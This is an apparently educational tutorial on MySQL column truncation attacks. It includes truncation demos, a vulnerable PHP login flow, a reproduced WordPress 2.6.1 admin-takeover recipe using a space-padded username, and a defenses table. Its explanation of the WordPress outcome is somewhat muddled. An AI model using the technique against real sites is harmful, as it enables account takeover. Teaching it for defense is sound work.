# 39 - SQL Column Truncation Attack

## MySQL SQL Modes and Strict Mode

MySQL's behavior on data overflow depends on the `sql-mode` setting.

**Strict mode (default in modern MySQL):**

```
sql-mode="STRICT_TRANS_TABLES,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION"
```

**Non-strict mode (legacy/misconfigured):**

```
sql-mode="NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION"
```

The key difference: `STRICT_TRANS_TABLES` controls whether MySQL **rejects** or **silently truncates** data that exceeds column length.

## The Truncation Behavior

### Setup — A Table with varchar(10) Columns

```sql
mysql> create table truncated_test (
    id int(11) NOT NULL auto_increment,
    username varchar(10) default NULL,
    password varchar(10) default NULL,
    PRIMARY KEY (id)
) DEFAULT CHARSET=utf8;
```

Both `username` and `password` are limited to 10 characters.

### Normal Insert

```sql
mysql> insert into truncated_test(username, password) values("admin", "pass");
Query OK, 1 row affected

mysql> select * from truncated_test;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | admin    | pass     |
+----+----------+----------+
```

### With STRICT_TRANS_TABLES — Overflow Is Rejected

```sql
mysql> insert into truncated_test(username, password)
    values("admin       x", "new_pass");
ERROR 1406 (22001): Data too long for column 'username' at row 1
```

`"admin       x"` is 16 characters (5 + 7 spaces + 1 'x'), exceeding varchar(10). Strict mode **rejects the entire insert**. The table is unchanged.

### Without STRICT_TRANS_TABLES — Silent Truncation

```sql
mysql> insert into truncated_test(username, password)
    values("admin       x", "new_pass");
Query OK, 1 row affected, 1 warning

mysql> select * from truncated_test;
+----+------------+----------+
| id | username   | password |
+----+------------+----------+
|  1 | admin      | pass     |
|  2 | admin      | new_pass |
+----+------------+----------+
```

**What happened:**

1. Input `"admin       x"` (16 chars) exceeds varchar(10)
2. MySQL silently **truncates** to 10 characters: `"admin     "` (admin + 5 spaces)
3. MySQL also **trims trailing spaces** in comparisons for `VARCHAR`
4. Now there are **two rows** where `username = 'admin'` — the original and the attacker's

## The Column Truncation Attack

### The Vulnerable Application Logic

```php
$userdata = null;
if (isPasswordCorrect($username, $password)) {
    $userdata = getUserDataByLogin($username);
    ...
}
```

**Step 1 — Authentication query:**

```sql
SELECT username FROM users WHERE username = ? AND passhash = ?
```

The app checks: does a user with this username AND this password exist?

**Step 2 — Data retrieval query:**

```sql
SELECT * FROM users WHERE username = ?
```

After authentication succeeds, the app fetches the user's full profile by username.

### The Attack Flow

```
Step 1: Attacker registers as "admin       x" with their own password
        ┌──────────────────────────────────┐
        │ Input: "admin       x" (16 chars) │
        │ MySQL truncates to: "admin     "  │
        │ Trailing spaces trimmed: "admin"  │
        │ Stored with attacker's password   │
        └──────────────────────────────────┘

Step 2: Attacker logs in as "admin" with their own password
        ┌──────────────────────────────────────────────────────┐
        │ SELECT ... WHERE username='admin' AND passhash=?     │
        │ → Matches ROW 2 (attacker's row, attacker's pass)   │
        │ → Authentication succeeds!                           │
        └──────────────────────────────────────────────────────┘

Step 3: App fetches user data by username
        ┌──────────────────────────────────────────────────────┐
        │ SELECT * FROM users WHERE username='admin'           │
        │ → Returns ROW 1 (the REAL admin's data!)             │
        │ → Attacker now has admin privileges                  │
        └──────────────────────────────────────────────────────┘
```

The attacker authenticates with their own password (matching their duplicate row), but the application loads the **original admin's profile and permissions**.

## Real-World Case: WordPress 2.6.1

```
Vulnerable Systems:
* WordPress version 2.6.1

Exploit:
1. Go to URL: server.com/wp-login.php?action=register
2. Register as:
   login: admin[55 spaces]x    (the user "admin" + 55 space chars + "x")
   email: attacker@evil.com

   Now, we have a duplicated 'admin' account in database

3. Go to URL: server.com/wp-login.php?action=lostpassword
4. Enter attacker's email into the field and submit
5. Check attacker's email and go to reset confirmation link
6. Admin's password is changed, but new password is sent
   to the REAL admin's email
```

### How the WordPress Attack Worked

1. **Registration** — WordPress's `username` column was `varchar(60)`. The attacker registered as `"admin" + 55 spaces + "x"` (61 chars). MySQL truncated to `"admin" + 55 spaces`, which compares equal to `"admin"`.

2. **Duplicate created** — The database now has two "admin" entries. The attacker's entry has their own email address.

3. **Password reset** — The attacker requests a password reset using their email. WordPress finds the attacker's row (matching email), generates a reset token, and sends it to the attacker's email.

4. **But which "admin" gets the new password?** — The reset updates the password for `WHERE username = 'admin'`, which could affect the original admin row depending on the query behavior.

### Why Spaces Are Special in MySQL

MySQL's `VARCHAR` comparison **ignores trailing spaces** by default:

```sql
mysql> SELECT 'admin' = 'admin     ';
+-------------------------+
| 'admin' = 'admin     '  |
+-------------------------+
|                       1 |  -- TRUE! They are "equal"
+-------------------------+
```

This means `"admin"` and `"admin     "` (with trailing spaces) are treated as the same value in `WHERE` clauses, even though they're stored differently.

## Defenses

| Defense | How it helps |
|---------|-------------|
| **Enable `STRICT_TRANS_TABLES`** | MySQL rejects inserts that exceed column length |
| **Add `UNIQUE` constraint on username** | Prevents duplicate entries regardless of truncation |
| **Trim and validate input length in application** | Reject usernames that exceed the column size before they reach the database |
| **Use the same query for auth and data** | Don't authenticate with one query and fetch data with another |
